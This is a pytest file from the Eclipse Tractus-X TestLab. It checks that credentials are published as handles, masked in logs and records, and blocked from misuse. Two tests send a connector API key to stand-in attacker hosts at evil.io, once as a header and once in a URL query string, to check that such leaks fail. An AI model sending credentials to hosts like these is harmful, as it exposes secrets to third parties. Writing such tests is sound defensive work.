#################################################################################
# Eclipse Tractus-X - Tractus-X TestLab
#
# Copyright (c) 2026 Contributors to the Eclipse Foundation
#
# See the NOTICE file(s) distributed with this work for additional
# information regarding copyright ownership.
#
# This program and the accompanying materials are made available under the
# terms of the Apache License, Version 2.0 which is available at
# https://www.apache.org/licenses/LICENSE-2.0.
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND,
# either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.
#
# SPDX-License-Identifier: Apache-2.0
#################################################################################
## This code was partially generated using artificial intelligence (AI) (Tool: Claude Code, Model: Claude Opus 5.5).
## It was reviewed and tested by a human committer.

"""What a run does with credentials: publish handles, mask values, refuse misuse."""

from __future__ import annotations

from collections.abc import Iterator
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from tractusx_testlab.authoring.test import Tck
from tractusx_testlab.compiler.validation._variable_declarations import (
    validate_variable_declarations,
)
from tractusx_testlab.config.settings import TestlabConfig
from tractusx_testlab.logging import wire
from tractusx_testlab.logging.masking import forget_secrets, mask, release_run
from tractusx_testlab.logging.wire.redaction import forget_secret_headers
from tractusx_testlab.models import Job, StepDefinition, StepStatus
from tractusx_testlab.models.authoring.definitions import TckDefinition, TckMetadataDefinition
from tractusx_testlab.models.domain.capabilities import ConnectorBinding
from tractusx_testlab.models.domain.infrastructure import EngineBindings, Infrastructure
from tractusx_testlab.player.execution._binding import publish_bindings
from tractusx_testlab.player.execution._context_seeder import seed_context_variables
from tractusx_testlab.player.execution._step_outputs import hide_secrets
from tractusx_testlab.player.execution.context import StepContext
from tractusx_testlab.player.execution.step_runner import run_step
from tractusx_testlab.security.credentials import Credential
from tractusx_testlab.server.callbacks import CallbackManager
from tractusx_testlab.services.instances import ServiceManager
from tractusx_testlab.steps.connector.dataplane import GetEdrStep
from tractusx_testlab.steps.http.request import HttpRequestStep
from tractusx_testlab.steps.mock.api import MockEndpointStep
from tractusx_testlab.steps.security.oauth2 import OAuth2ClientCredentialsStep
from tractusx_testlab.steps.step_contract import StepOutput

_KEY = "platform-management-key-0123"
_TOKEN = "eyJhbGciOiJSUzI1NiJ9.edr-token-value"
_RUN = "run-1"


@pytest.fixture(autouse=True)
def _fresh() -> Iterator[None]:
    forget_secrets()
    forget_secret_headers()
    yield
    forget_secrets()
    forget_secret_headers()


def _context(**config: Any) -> StepContext:
    return StepContext(
        services=ServiceManager(), job=Job(job_id=_RUN), config=TestlabConfig(**config)
    )


def _engine() -> Infrastructure:
    return Infrastructure(
        engine=EngineBindings(
            connector=ConnectorBinding(
                management_url="https://cp.example.com/management",
                api_key=_KEY,
                api_key_header="X-EDC-Key",
                participant_id="BPNL000000000001",
            )
        )
    )


class TestPublishBindings:
    def test_the_key_is_a_handle_and_its_value_is_masked_for_the_run(self) -> None:
        context = _context()
        publish_bindings(_engine(), context)

        assert isinstance(
            context.get_variable("infrastructure.engine.connector.api_key"), Credential
        )
        assert mask(f"key={_KEY}") == "key=***"
        assert wire.safe_headers({"X-EDC-Key": "k"}) == {"X-EDC-Key": "***"}

    def test_the_run_s_key_stays_masked_after_the_run_released_it(self) -> None:
        publish_bindings(_engine(), _context())
        release_run(_RUN)
        assert mask(_KEY) == "***"

    def test_a_key_override_for_an_unbound_capability_is_removed(self) -> None:
        context = _context()
        context.set_variable("infrastructure.sut.connector.api_key", "operator-typed-key")
        publish_bindings(_engine(), context)
        assert not context.has_variable("infrastructure.sut.connector.api_key")


def _tck(*variables: dict[str, Any]) -> Tck:
    return Tck(
        TckDefinition(
            kind="tck",
            syntax="v1-alpha",
            id="secrets-tck",
            metadata=TckMetadataDefinition(name="Secrets", version="1.0"),
            env={"variables": list(variables)},
        )
    )


def _input(var_id: str, secret: object = None) -> dict[str, Any]:
    entry: dict[str, Any] = {
        "id": var_id,
        "uses": "variable/type/string",
        "with": {"source": "input", "scope": "sut"},
        "returns": {"value": {"type": "string"}},
    }
    if secret is not None:
        entry["secret"] = secret
    return entry


class TestSecretInputs:
    def test_an_input_declared_secret_is_masked_and_still_readable(self) -> None:
        context = _context()
        seed_context_variables(
            context, _tck(_input("sut_bearer", secret=True)), {"sut_bearer": "opaque-value-123"}
        )
        # The value stays a plain string the run reads; only records mask it.
        assert context.get_variable("sut_bearer") == "opaque-value-123"
        assert mask("opaque-value-123") == "***"

    def test_a_static_secret_value_is_masked_too(self) -> None:
        entry = {
            "id": "shared_token_value",
            "uses": "variable/type/string",
            "secret": True,
            "with": {"value": "static-secret-value"},
            "returns": {"value": {"type": "string"}},
        }
        seed_context_variables(_context(), _tck(entry), None)
        assert mask("static-secret-value") == "***"

    @pytest.mark.parametrize(
        "name", ["client_secret", "SUT_PASSWORD", "dtr_api-key", "access_token", "credential"]
    )
    def test_an_input_named_like_a_credential_is_masked(self, name: str) -> None:
        seed_context_variables(_context(), _tck(), {name: "opaque-value-123"})
        assert mask("opaque-value-123") == "***"

    def test_an_ordinary_input_is_not(self) -> None:
        seed_context_variables(_context(), _tck(_input("bpn")), {"bpn": "BPNL000000000001"})
        assert mask("BPNL000000000001") == "BPNL000000000001"


class TestSecretFlag:
    def test_it_compiles(self) -> None:
        assert validate_variable_declarations({"variables": [_input("k", secret=True)]}) == []

    def test_anything_but_a_boolean_is_refused(self) -> None:
        errors = validate_variable_declarations({"variables": [_input("k", secret="yes")]})
        assert errors == ["Variable 'k' has 'secret: yes'. Write 'secret: true' or leave it out."]

    def test_an_embedder_reads_it_off_the_declaration(self) -> None:
        variables = _tck(_input("sut_bearer", secret=True), _input("bpn")).all_variables()
        assert variables["sut_bearer"].secret is True
        assert variables["bpn"].secret is False

    def test_the_legacy_mapping_form_carries_it_too(self) -> None:
        tck = Tck(
            TckDefinition(
                kind="tck",
                syntax="v1-alpha",
                id="legacy",
                metadata=TckMetadataDefinition(name="Legacy", version="1.0"),
                env={"variables": {"token": {"type": "str", "runtime": True, "secret": True}}},
            )
        )
        assert tck.all_variables()["token"].secret is True


class TestHiddenOutputs:
    def test_an_edr_token_and_its_data_address_are_masked_the_moment_they_exist(self) -> None:
        output = StepOutput(
            value={
                "dataplane_url": "https://dp/public",
                "edr_token": _TOKEN,
                "data_address": {
                    "endpoint": "https://dp/public",
                    "authorization": f"{_TOKEN}-2",
                    "refreshToken": f"{_TOKEN}-3",
                },
            }
        )
        hide_secrets(GetEdrStep, StepDefinition(uses="connector/consumer/get_edr"), output)

        assert mask(f"{_TOKEN} {_TOKEN}-2 {_TOKEN}-3") == "*** *** ***"
        assert output.value["edr_token"] == _TOKEN

    def test_token_endpoint_outputs_are_secret(self) -> None:
        output = StepOutput(value={"access_token": _TOKEN, "refresh_token": f"{_TOKEN}-r"})
        hide_secrets(
            OAuth2ClientCredentialsStep,
            StepDefinition(uses="security/oauth2/client_credentials"),
            output,
        )
        assert mask(f"{_TOKEN} {_TOKEN}-r") == "*** ***"

    def test_hidden_false_still_shows_an_output_the_author_unhid(self) -> None:
        output = StepOutput(value={"api_key": "mock-api-key-0123"})
        hide_secrets(
            MockEndpointStep,
            StepDefinition.model_validate(
                {"uses": "mock/api", "returns": {"api_key": {"type": "string", "hidden": False}}}
            ),
            output,
        )
        assert mask("mock-api-key-0123") == "mock-api-key-0123"


class TestMisuseFailsTheStep:
    @pytest.mark.asyncio
    async def test_sending_the_key_elsewhere_fails_with_a_stable_code(self) -> None:
        context = _context()
        publish_bindings(_engine(), context)
        step = StepDefinition.model_validate(
            {
                "uses": "http/http_request",
                "with": {
                    "url": "https://cp.example.com.evil.io/management",
                    "headers": {"x-api-key": "${{ infrastructure.engine.connector.api_key }}"},
                },
            }
        )

        result = await run_step(HttpRequestStep, step, "leak", context)

        assert result.status == StepStatus.FAILED
        assert result.error_code == "CREDENTIAL_ORIGIN_MISMATCH"
        assert _KEY not in (result.error or "")
        assert _KEY not in result.model_dump_json()

    @pytest.mark.asyncio
    async def test_a_withheld_side_fails_with_its_own_code(self) -> None:
        context = _context(credential_release={"sut"})
        publish_bindings(_engine(), context)
        step = StepDefinition.model_validate(
            {
                "uses": "http/http_request",
                "with": {
                    "url": "https://cp.example.com/management/v3/assets",
                    "headers": {"x-api-key": "${{ infrastructure.engine.connector.api_key }}"},
                },
            }
        )

        result = await run_step(HttpRequestStep, step, "withheld", context)

        assert result.error_code == "CREDENTIAL_NOT_RELEASED"

    @pytest.mark.asyncio
    async def test_interpolating_the_key_fails_before_anything_is_sent(self) -> None:
        context = _context()
        publish_bindings(_engine(), context)
        step = StepDefinition.model_validate(
            {
                "uses": "http/http_request",
                "with": {
                    "url": "https://evil.io/?k=${{ infrastructure.engine.connector.api_key }}"
                },
            }
        )

        result = await run_step(HttpRequestStep, step, "interpolate", context)

        assert result.error_code == "CREDENTIAL_MISUSE"
        assert result.inputs is None


class TestTheCatalogueFormStillWorks:
    @pytest.mark.asyncio
    async def test_a_whole_header_to_the_binding_s_origin_is_sent_and_recorded_masked(
        self,
    ) -> None:
        context = _context()
        publish_bindings(_engine(), context)
        step = StepDefinition.model_validate(
            {
                "uses": "http/http_request",
                "with": {
                    "url": "${{ infrastructure.engine.connector.management_url }}/v3/assets",
                    "headers": {"x-api-key": "${{ infrastructure.engine.connector.api_key }}"},
                },
            }
        )
        response = MagicMock(status_code=200, url="https://cp.example.com/management/v3/assets")
        response.headers = MagicMock(raw=[], **{"get.side_effect": {}.get})
        response.text = ""

        with patch(
            "tractusx_testlab.steps.http_client.request",
            new_callable=AsyncMock,
            return_value=response,
        ) as request:
            result = await run_step(HttpRequestStep, step, "create_asset", context)

        assert result.status == StepStatus.PASSED
        assert request.call_args.kwargs["headers"]["x-api-key"] == _KEY
        assert _KEY not in result.model_dump_json()
        assert _KEY not in wire.as_recorded(result).model_dump_json()


class TestReleasePolicySetting:
    def test_both_sides_are_released_by_default(self) -> None:
        assert TestlabConfig().credential_release == frozenset({"engine", "sut"})

    def test_a_host_narrows_it_from_the_environment(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("TESTLAB_CREDENTIAL_RELEASE", '["sut"]')
        assert TestlabConfig().credential_release == frozenset({"sut"})

    def test_an_unknown_side_is_refused(self) -> None:
        with pytest.raises(ValueError):
            TestlabConfig(credential_release={"platform"})


def test_inbound_callback_headers_are_redacted_before_they_are_kept() -> None:
    manager = CallbackManager()
    manager.resolve(
        "/cb", "POST", {"Authorization": "Bearer abc", "Content-Type": "application/json"}, {}
    )
    buffered = next(iter(manager._buffered.values()))
    assert buffered.headers == {"Authorization": "***", "Content-Type": "application/json"}
